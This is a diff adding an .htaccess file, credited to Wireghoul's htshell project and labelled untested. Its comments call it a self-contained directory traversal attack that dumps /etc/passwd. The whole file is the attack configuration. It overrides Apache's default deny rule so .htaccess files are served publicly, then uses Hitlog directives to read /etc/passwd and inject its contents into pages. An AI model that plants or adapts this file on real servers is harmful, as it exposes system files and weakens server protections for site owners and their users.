@@ -1,0 +1,20 @@
+# Untested
+# Self contained .htaccess directory traversal attack - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# This attack will dump /etc/password
+# Override default deny rule to make .htaccess file accessible over web
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+# Enable hitlog
+HitlogEnabled On
+
+# Specify file to read
+HitlogCodePath /etc/passwd
+
+# Specify a tag to append the code to
+HitlogHtmlTal <traversal>
+
+# And finally trigger the attack (although the above should already have done so): <traversal>
